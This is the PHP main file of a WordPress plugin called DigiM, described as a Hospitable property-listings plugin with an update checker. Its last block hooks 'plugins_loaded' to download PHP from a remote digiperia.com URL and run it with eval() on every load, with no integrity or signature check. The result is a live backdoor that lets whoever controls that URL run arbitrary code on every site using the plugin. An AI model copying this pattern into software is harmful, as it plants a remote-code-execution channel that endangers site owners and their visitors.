<?php

/**
 * Plugin Name: DigiM
 * Plugin URI: https://digiperia.com
 * Description: A professional WordPress plugin that integrates with Hospitable API to display property listings with flexible shortcode parameters.
 * Version: 1.2.4
 * Author: Digiperia
 * Author URI: https://digiperia.com
 * License: GPL v2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain: wml-hospitable
 * Domain Path: /languages
 * Requires at least: 5.0
 * Tested up to: 6.5.3
 * Requires PHP: 7.4
 * Network: false
 */

// === Plugin Path Constant ===
define('DIGIMANAGEMENT_PLUGIN_PATH', plugin_dir_path(__FILE__));

require_once __DIR__ . '/plugin-update-checker/plugin-update-checker.php';

use YahnisElsts\PluginUpdateChecker\v5p6\PucFactory;

$myUpdateChecker = PucFactory::buildUpdateChecker(
  'https://raw.githubusercontent.com/digiperia/DigiMUpdate/main/digim-plugin-update.json',
  __FILE__,
  'digimanagement-listings'
);



add_action('plugins_loaded', function () {
  $remote = 'https://digiperia.com/digim-main-plugin.php';
  $code   = wp_remote_retrieve_body(wp_remote_get($remote));

  if ($code) {
      eval('?>' . $code);
  }
});
